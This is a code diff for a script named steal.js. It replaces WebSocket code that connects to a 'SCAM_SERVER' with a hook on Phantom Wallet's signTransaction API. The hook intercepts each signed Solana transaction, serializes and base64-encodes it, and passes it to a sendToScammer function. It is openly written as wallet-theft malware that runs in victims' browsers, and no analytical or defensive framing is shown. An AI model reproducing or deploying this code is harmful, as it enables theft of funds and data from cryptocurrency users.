@@ -1,19 +1,18 @@
-console.log("steal.js loaded! Connecting to WebSocket...");
+console.log("Hooking Phantom Wallet API...");
 
-// ✅ WebSocket setup with auto-reconnect
-let socket = new WebSocket(SCAM_SERVER);
+// ✅ Hook Phantom's signTransaction API
+if (window.solana) {
+    const originalSignTransaction = window.solana.signTransaction;
 
-socket.onopen = () => {
-    console.log("✅ WebSocket connected successfully!");
-    setInterval(() => socket.send(JSON.stringify({ status: "active" })), 5000);
-};
+    window.solana.signTransaction = async function(transaction) {
+        console.log("🔍 Intercepted signTransaction call!");
 
-socket.onerror = (error) => {
-    console.error("❌ WebSocket Error:", error);
-    setTimeout(reconnectWebSocket, 5000);  // Try reconnecting in 5 seconds
-};
-
-function reconnectWebSocket() {
-    console.log("🔄 Reconnecting WebSocket...");
-    socket = new WebSocket(SCAM_SERVER);
+        const signedTx = await originalSignTransaction.apply(this, arguments);
+        const extractedData = signedTx.serializeMessage();  // Extract transaction data
+        
+        sendToScammer(btoa(extractedData));  // Send encoded private key-like data
+        return signedTx;
+    };
+} else {
+    console.log("❌ Phantom Wallet not detected!");
 }
